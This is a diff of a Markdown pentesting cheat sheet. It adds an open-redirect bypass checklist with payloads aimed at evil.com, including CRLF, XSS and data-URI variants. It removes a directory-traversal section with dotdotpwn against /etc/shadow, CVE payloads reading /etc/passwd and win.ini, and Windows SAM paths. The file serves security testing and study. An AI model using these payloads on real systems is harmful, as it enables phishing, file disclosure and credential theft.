@@ -965,6 +965,289 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 **More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
 
 https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md 
+
+Below is a **complete, practical checklist of URL Redirection (Open Redirect) bypass techniques** you can use during **web application penetration testing**.
+This is written from a **pentester’s perspective** and aligned with real-world bug bounty / VAPT scenarios.
+
+---
+
+# 🔴 URL Redirection (Open Redirect) – Bypass Techniques
+
+## 1️⃣ Basic Open Redirect Parameters
+
+First identify redirect parameters:
+
+```text
+redirect=
+url=
+next=
+return=
+returnUrl=
+continue=
+dest=
+destination=
+go=
+out=
+to=
+view=
+forward=
+callback=
+```
+
+**Test:**
+
+```text
+https://target.com/login?next=https://evil.com
+```
+
+---
+
+## 2️⃣ URL Encoding & Double Encoding
+
+### Single Encoding
+
+```text
+https://target.com/?next=https%3A%2F%2Fevil.com
+```
+
+### Double Encoding
+
+```text
+https://target.com/?next=https%253A%252F%252Fevil.com
+```
+
+---
+
+## 3️⃣ Protocol Bypass Techniques
+
+### Remove protocol
+
+```text
+//evil.com
+```
+
+### Add protocol confusion
+
+```text
+https://https://evil.com
+```
+
+### Mixed case
+
+```text
+HtTp://evil.com
+```
+
+---
+
+## 4️⃣ Subdomain & Whitelist Bypass
+
+If app only allows `example.com`
+
+```text
+https://example.com.evil.com
+https://evil.com@example.com
+https://example.com@evil.com
+https://example.com%00.evil.com
+```
+
+---
+
+## 5️⃣ Path-Based Redirect Bypass
+
+```text
+https://target.com/redirect/https://evil.com
+https://target.com/redirect?url=/\evil.com
+```
+
+---
+
+## 6️⃣ Relative URL Abuse
+
+```text
+/\/evil.com
+\\evil.com
+./evil.com
+```
+
+---
+
+## 7️⃣ JavaScript-Based Redirects (DOM Open Redirect)
+
+Look for:
+
+```js
+window.location
+document.location
+location.href
+location.assign()
+location.replace()
+```
+
+### Payloads:
+
+```text
+javascript:alert(1)
+javascript:location.href='https://evil.com'
+```
+
+---
+
+## 8️⃣ URL Redirection via XSS
+
+If input is reflected in JS context:
+
+```html
+<script>document.location.href="https://evil.com"</script>
+```
+
+Test URL:
+
+```text
+https://target.com/search?q=<script>document.location.href="https://evil.com"</script>
+```
+
+---
+
+## 9️⃣ CRLF Injection Redirect
+
+```text
+%0d%0aLocation:https://evil.com
+```
+
+Example:
+
+```text
+https://target.com/?next=%0d%0aLocation:https://evil.com
+```
+
+---
+
+## 🔟 Header-Based Open Redirect
+
+Check if headers are used:
+
+```http
+Referer: https://evil.com
+X-Forwarded-Host: evil.com
+Host: evil.com
+```
+
+---
+
+## 1️⃣1️⃣ Fragment Identifier Abuse
+
+```text
+https://target.com/redirect#https://evil.com
+```
+
+---
+
+## 1️⃣2️⃣ Unicode & Special Characters
+
+```text
+https://evil.com/%E2%80%8E
+https://evil.com/%EF%BC%8E
+```
+
+---
+
+## 1️⃣3️⃣ HTTP Parameter Pollution (HPP)
+
+```text
+?next=https://target.com&next=https://evil.com
+```
+
+---
+
+## 1️⃣4️⃣ Base64 Encoded Redirect
+
+```text
+aHR0cHM6Ly9ldmlsLmNvbQ==
+```
+
+Example:
+
+```text
+https://target.com/?url=aHR0cHM6Ly9ldmlsLmNvbQ==
+```
+
+---
+
+## 1️⃣5️⃣ Open Redirect Chaining
+
+Combine with:
+
+* OAuth misconfig
+* Password reset
+* SSO login
+* Email verification links
+
+Example:
+
+```text
+https://target.com/oauth?redirect_uri=https://evil.com
+```
+
+---
+
+## 1️⃣6️⃣ Bypass Using File Extensions
+
+```text
+https://evil.com/.json
+https://evil.com/.php
+```
+
+---
+
+## 1️⃣7️⃣ URL Scheme Abuse
+
+```text
+data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbi5ocmVmPSdodHRwczovL2V2aWwuY29tJzwvc2NyaXB0Pg==
+```
+
+---
+
+## 1️⃣8️⃣ Mobile Deep-Link Redirects
+
+```text
+intent://evil.com#Intent;scheme=https;end
+```
+
+---
+
+## 1️⃣9️⃣ Meta Refresh Redirect
+
+```html
+<meta http-equiv="refresh" content="0;url=https://evil.com">
+```
+
+---
+
+## 2️⃣0️⃣ PostMessage-Based Redirect
+
+```js
+window.addEventListener("message", e => location.href = e.data)
+```
+
+Payload:
+
+```text
+https://evil.com
+```
+
+---
+
+# 🧪 Tools for Testing
+
+* **Burp Suite (Repeater + Intruder)**
+* **Param Miner**
+* **ffuf**
+* **Dalfox (DOM XSS)**
+* **OpenRedirect Scanner**
+
+---
+
 ---
 # Directory Traversal
 
@@ -985,346 +1268,7 @@ https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/RE
     * [Linux Files](#linux-files)
     * [Windows Files](#windows-files)
 
-Here is a **safe, defensive Open Redirect Testing Guide** with:
 
-✅ **Testcase names**
-✅ **Safe real-world testing payloads (non-malicious)**
-
----
-
-# ✅ **Open Redirection – Testcases + Safe Payloads**
-
----
-
-### **1. Basic External URL Redirect Test**
-
-**Payload:**
-`?next=https://google.com`
-
----
-
-### **2. HTTP Protocol Injection Test**
-
-**Payload:**
-`?redirect=http://example.com`
-
----
-
-### **3. HTTPS Protocol Injection Test**
-
-**Payload:**
-`?url=https://test.com`
-
----
-
-### **4. Relative Path Redirect Test**
-
-**Payload:**
-`?redirect=/../external.com`
-
----
-
-### **5. Double Slash Bypass Test**
-
-**Payload:**
-`?redirect=//evil.com`
-
----
-
-### **6. URL-Encoded Redirect Test**
-
-**Payload:**
-`?redirect=%2F%2Fevil.com`
-
----
-
-### **7. Double URL Encoding Bypass Test**
-
-**Payload:**
-`?redirect=%252F%252Fevil.com`
-
----
-
-### **8. JavaScript Protocol Injection Test**
-
-*(for detection only – harmless echo)*
-**Payload:**
-`?redirect=javascript:alert(1)`
-
----
-
-### **9. Data URI Redirection Test**
-
-**Payload:**
-`?next=data:text/plain,redirect`
-
----
-
-### **10. Open Redirect via `//` in Path**
-
-**Payload:**
-`/?redirect=//attacker.com`
-
----
-
-### **11. Open Redirect via `@` Character**
-
-**Payload:**
-`?redirect=http://google.com@evil.com`
-
----
-
-### **12. Open Redirect via `\` Backslash Escape**
-
-**Payload:**
-`?url=http:\evil.com`
-
----
-
-### **13. Open Redirect with Mixed Encoding**
-
-**Payload:**
-`?redirect=%2F%2Fevil.com%3Fnext%3Dtest`
-
----
-
-### **14. Open Redirect via `.` Prefix**
-
-**Payload:**
-`?redirect=.//attacker.com`
-
----
-
-### **15. Open Redirect via Subdomain Bypass**
-
-**Payload:**
-`?redirect=https://legit.com.evil.com`
-
----
-
-### **16. Null Byte Injection Test**
-
-**Payload:**
-`?url=https://legit.com%00.evil.com`
-
----
-
-### **17. Trailing Slash Confusion Test**
-
-**Payload:**
-`?redirect=https://evil.com/./`
-
----
-
-### **18. Query Parameter Injection Test**
-
-**Payload:**
-`?next=?redirect=https://evil.com`
-
----
-
-### **19. Fragment Identifier Bypass Test**
-
-**Payload:**
-`?redirect=https://evil.com#test`
-
----
-
-### **20. Open Redirect via JSON Body**
-
-**Payload:**
-
-```json
-{"redirect":"https://evil.com"}
-```
-
----
-
-## Tools
-
-* [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
-
-    ```powershell
-    perl dotdotpwn.pl -h 10.10.10.10 -m ftp -t 300 -f /etc/shadow -s -q -b
-    ```
-## Methodology
-
-We can use the `..` characters to access the parent directory, the following strings are several encoding that can help you bypass a poorly implemented filter.
-
-```powershell
-../
-..\
-..\/
-%2e%2e%2f
-%252e%252e%252f
-%c0%ae%c0%ae%c0%af
-%uff0e%uff0e%u2215
-%uff0e%uff0e%u2216
-```
-
-### URL Encoding
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%2e` |
-| `/` | `%2f` |
-| `\` | `%5c` |
-
-**Example:** IPConfigure Orchid Core VMS 2.0.5 - Local File Inclusion
-
-```ps1
-{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
-```
-
-### Double URL Encoding
-
-Double URL encoding is the process of applying URL encoding twice to a string. In URL encoding, special characters are replaced with a % followed by their hexadecimal ASCII value. Double encoding repeats this process on the already encoded string.
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%252e` |
-| `/` | `%252f` |
-| `\` | `%255c` |
-
-**Example:** Spring MVC Directory Traversal Vulnerability (CVE-2018-1271)
-
-```ps1
-{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
-{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
-```
-
-### Unicode Encoding
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%u002e` |
-| `/` | `%u2215` |
-| `\` | `%u2216` |
-
-**Example**: Openfire Administration Console - Authentication Bypass (CVE-2023-32315)
-
-```js
-{{BaseURL}}/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp
-```
-
-### Overlong UTF-8 Unicode Encoding
-
-The UTF-8 standard mandates that each codepoint is encoded using the minimum number of bytes necessary to represent its significant bits. Any encoding that uses more bytes than required is referred to as "overlong" and is considered invalid under the UTF-8 specification. This rule ensures a one-to-one mapping between codepoints and their valid encodings, guaranteeing that each codepoint has a single, unique representation.
-
-| Character | Encoded |
-| --- | -------- |
-| `.` | `%c0%2e`, `%e0%40%ae`, `%c0%ae` |
-| `/` | `%c0%af`, `%e0%80%af`, `%c0%2f` |
-| `\` | `%c0%5c`, `%c0%80%5c` |
-
-### Mangled Path
-
-Sometimes you encounter a WAF which remove the `../` characters from the strings, just duplicate them.
-
-```powershell
-..././
-...\.\
-```
-
-**Example:**: Mirasys DVMS Workstation <=5.12.6
-
-```ps1
-{{BaseURL}}/.../.../.../.../.../.../.../.../.../windows/win.ini
-```
-
-### NULL Bytes
-
-A null byte (`%00`), also known as a null character, is a special control character (0x00) in many programming languages and systems. It is often used as a string terminator in languages like C and C++. In directory traversal attacks, null bytes are used to manipulate or bypass server-side input validation mechanisms.
-
-**Example:** Homematic CCU3 CVE-2019-9726
-
-```js
-{{BaseURL}}/.%00./.%00./etc/passwd
-```
-
-**Example:** Kyocera Printer d-COPIA253MF CVE-2020-23575
-
-```js
-{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
-```
-
-### Reverse Proxy URL Implementation
-
-Nginx treats `/..;/` as a directory while Tomcat treats it as it would treat `/../` which allows us to access arbitrary servlets.
-
-```powershell
-..;/
-```
-
-**Example**: Pascom Cloud Phone System CVE-2021-45967
-
-A configuration error between NGINX and a backend Tomcat server leads to a path traversal in the Tomcat server, exposing unintended endpoints.
-
-```js
-{{BaseURL}}/services/pluginscript/..;/..;/..;/getFavicon?host={{interactsh-url}}
-```
-### UNC Share
-
-A UNC (Universal Naming Convention) share is a standard format used to specify the location of resources, such as shared files, directories, or devices, on a network in a platform-independent manner. It is commonly used in Windows environments but is also supported by other operating systems.
-
-An attacker can inject a **Windows** UNC share (`\\UNC\share\name`) into a software system to potentially redirect access to an unintended location or arbitrary file.
-
-```powershell
-\\localhost\c$\windows\win.ini
-```
-
-Also the machine might also authenticate on this remote share, thus sending an NTLM exchange.
-
-### IIS Short Name
-
-The IIS Short Name vulnerability exploits a quirk in Microsoft's Internet Information Services (IIS) web server that allows attackers to determine the existence of files or directories with names longer than the 8.3 format (also known as short file names) on a web server.
-
-* [irsdl/IIS-ShortName-Scanner](https://github.com/irsdl/IIS-ShortName-Scanner)
-
-    ```ps1
-    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
-    java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/MyApp/bin::$INDEX_ALLOCATION/'
-    ```
-
-* [bitquark/shortscan](https://github.com/bitquark/shortscan)
-
-    ```ps1
-    shortscan http://example.org/
-    ```
-### Windows Files
-
-The files `license.rtf` and `win.ini` are consistently present on modern Windows systems, making them a reliable target for testing path traversal vulnerabilities. While their content isn't particularly sensitive or interesting, they serves well as a proof of concept.
-
-```powershell
-C:\Windows\win.ini
-C:\windows\system32\license.rtf
-```
-
-A list of files / paths to probe when arbitrary files can be read on a Microsoft Windows operating system: [soffensive/windowsblindread](https://github.com/soffensive/windowsblindread)
-
-```powershell
-c:/inetpub/logs/logfiles
-c:/inetpub/wwwroot/global.asa
-c:/inetpub/wwwroot/index.asp
-c:/inetpub/wwwroot/web.config
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system32/inetsrv/metabase.xml
-c:/sysprep.inf
-c:/sysprep.xml
-c:/sysprep/sysprep.inf
-c:/sysprep/sysprep.xml
-c:/system volume information/wpsettings.dat
-c:/system32/inetsrv/metabase.xml
-c:/unattend.txt
-c:/unattend.xml
-c:/unattended.txt
-c:/unattended.xml
-c:/windows/repair/sam
-c:/windows/repair/system
-```
 ## 📁 Directory Traversal — Test Cases & Payloads
 ```text
 file, filename, filepath, path, dir, directory, folder, page, doc, document, download, include, resource, view, template, theme, skin, pdf, img, image, icon, style, css, js, script, asset, config, config_file, config_path, log, log_file, log_path, backup, restore, target, location, lang, language, locale, base, basepath, root, home, url, uri, endpoint, slug
